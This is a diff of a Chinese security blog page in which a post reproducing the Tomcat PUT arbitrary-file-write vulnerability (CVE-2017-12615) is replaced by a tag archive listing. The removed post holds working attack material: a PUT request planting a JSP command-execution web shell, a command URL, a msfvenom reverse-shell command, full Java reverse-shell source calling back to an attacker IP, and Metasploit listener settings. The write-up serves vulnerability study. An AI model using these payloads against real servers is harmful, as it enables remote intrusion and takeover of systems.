@@ -6,26 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://laohuan12138.github.io">
-  <title>Tomcat Put方法任意写文件漏洞(CVE-2017-12615) | Laohuan&#39;s Blog</title>
+  <title>Tag: 试题 | Laohuan&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="背景在运行Tomcat的主机上并且启用了HTTP PUT请求方法，readonly参数设置为false，攻击者能够将文件写入到服务器。Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特点来绕过了限制。Linux下可以使用“&#x2F;”,Windows下可以使用“%20”">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Tomcat Put方法任意写文件漏洞(CVE-2017-12615)">
-<meta property="og:url" content="https://laohuan12138.github.io/2020/07/19/Tomcat-Put%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E-CVE-2017-12615/index.html">
+  <meta name="description" content="爱生活，爱技术，更爱祖国">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Laohuan&#39;s Blog">
+<meta property="og:url" content="https://laohuan12138.github.io/tags/%E8%AF%95%E9%A2%98/index.html">
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
-<meta property="og:description" content="背景在运行Tomcat的主机上并且启用了HTTP PUT请求方法，readonly参数设置为false，攻击者能够将文件写入到服务器。Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特点来绕过了限制。Linux下可以使用“&#x2F;”,Windows下可以使用“%20”">
+<meta property="og:description" content="爱生活，爱技术，更爱祖国">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://cdn.laohuan.art/%E3%80%812020-07-17_14-22-55.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-17_14-39-07.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-17_14-36-54.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-17_14-37-18.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-17_15-06-30.png">
-<meta property="article:published_time" content="2020-07-19T12:40:10.000Z">
-<meta property="article:modified_time" content="2021-04-19T03:46:52.872Z">
 <meta property="article:author" content="Laohuan">
-<meta property="article:tag" content="Tomcat">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://cdn.laohuan.art/%E3%80%812020-07-17_14-22-55.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -243,256 +234,71 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-Tomcat-Put方法任意写文件漏洞-CVE-2017-12615" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 class="article-title" itemprop="name">
-      Tomcat Put方法任意写文件漏洞(CVE-2017-12615)
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2022" class="archive-year">2022</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	
+<a href="/2022/07/13/PTE%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2022-07-13T15:38:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-13</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2022/07/13/PTE%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/">PTE试题记录</a>
     </h1>
   
 
-        
-
-        
-        
-        
-<a href="/2020/07/19/Tomcat-Put%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E-CVE-2017-12615/" class="archive-article-date">
-  	<time datetime="2020-07-19T12:40:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-19</time>
-</a>
-        
-		
-	
-      </header>
-	  <div align="center" class="post-count">
-    字数：516字 | 预计阅读时长：2分钟
-</div>
-	  
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4><span id="背景">背景</span></h4><p>在运行Tomcat的主机上并且启用了HTTP PUT请求方法，<strong>readonly</strong>参数设置为false，攻击者能够将文件写入到服务器。Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特点来绕过了限制。Linux下可以使用“/”,Windows下可以使用“%20”</p>
-<a id="more"></a>
-
-<h4><span id="复现过程">复现过程</span></h4><p>发送如下payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    if(&quot;123456&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line"></span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line"></span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line"></span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line"></span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line"></span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line"></span><br><span class="line">            out.println(new String(b));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://cdn.laohuan.art/%E3%80%812020-07-17_14-22-55.png" alt></p>
-<p>返回201后便在网站目录下生成了1.jsp文件</p>
-<p><img src="http://cdn.laohuan.art/2020-07-17_14-39-07.png" alt></p>
-<p>访问shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;IP:8080&#x2F;1.jsp?pwd&#x3D;123456&amp;i&#x3D;whoami</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://cdn.laohuan.art/2020-07-17_14-36-54.png" alt></p>
-<p><img src="http://cdn.laohuan.art/2020-07-17_14-37-18.png" alt></p>
-<p>也可以使用msf的jsp反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;VPSIP LPORT&#x3D;4444 R &gt; cmd.jsp</span><br></pre></td></tr></table></figure>
-
-<p>生成cmd.jsp,将其内容put到服务器</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.net.*"</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">StreamConnector</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    InputStream yw;</span><br><span class="line">    OutputStream jz;</span><br><span class="line"></span><br><span class="line">    StreamConnector( InputStream yw, OutputStream jz )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">this</span>.yw = yw;</span><br><span class="line">      <span class="keyword">this</span>.jz = jz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      BufferedReader bx  = <span class="keyword">null</span>;</span><br><span class="line">      BufferedWriter dob = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        bx  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader( <span class="keyword">this</span>.yw ) );</span><br><span class="line">        dob = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter( <span class="keyword">this</span>.jz ) );</span><br><span class="line">        <span class="keyword">char</span> buffer[] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">8192</span>];</span><br><span class="line">        <span class="keyword">int</span> length;</span><br><span class="line">        <span class="keyword">while</span>( ( length = bx.read( buffer, <span class="number">0</span>, buffer.length ) ) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          dob.write( buffer, <span class="number">0</span>, length );</span><br><span class="line">          dob.flush();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span>( bx != <span class="keyword">null</span> )</span><br><span class="line">          bx.close();</span><br><span class="line">        <span class="keyword">if</span>( dob != <span class="keyword">null</span> )</span><br><span class="line">          dob.close();</span><br><span class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    String ShellPath;</span><br><span class="line"><span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"cmd.exe"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    Socket socket = <span class="keyword">new</span> Socket( <span class="string">"反弹IP"</span>, <span class="number">4444</span> );</span><br><span class="line">    Process process = Runtime.getRuntime().exec( ShellPath );</span><br><span class="line">    ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</span><br><span class="line">    ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</span><br><span class="line">  &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>msf设置好监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload java/jsp_shell_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>成功回连</p>
-<p><img src="http://cdn.laohuan.art/2020-07-17_15-06-30.png" alt></p>
-<p>参考链接</p>
-<p><a href="https://www.freebuf.com/vuls/148283.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/148283.html</a></p>
-<p><a href="https://www.cnblogs.com/swyft/articles/5563732.html" target="_blank" rel="noopener">https://www.cnblogs.com/swyft/articles/5563732.html</a></p>
-
-      
-
-
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/img/wx.jpg">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-	
-	
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Tomcat</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">试题</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/漏洞复现//" class="article-tag-list-link color5">漏洞复现</a>
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://laohuan12138.github.io/2020/07/19/Tomcat-Put%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E-CVE-2017-12615/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2020/07/21/zabbix-sql%E6%B3%A8%E5%85%A5-CVE-2016-10134/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          zabbix sql注入(CVE-2016-10134)
-        
-      </div>
-    </a>
   
   
-    <a href="/2020/07/15/shift%E5%8F%B3%E9%94%AE%E6%89%93%E5%BC%80CMD%E7%AA%97%E5%8F%A3/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">shift右键打开CMD窗口</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text">复现过程</span></a></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-  <div id="SOHUCS" sid="Tomcat-Put方法任意写文件漏洞-CVE-2017-12615" ></div> 
-<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
-<script type="text/javascript">
-    window.changyan.api.config({
-        appid: "cyuPYrWo4",
-        conf: "4cd557d42e4500a50a084352c8e8712d"
-    });
-</script>
-</script>
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -544,9 +350,9 @@ setInterval("createtime()",250);
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: false,
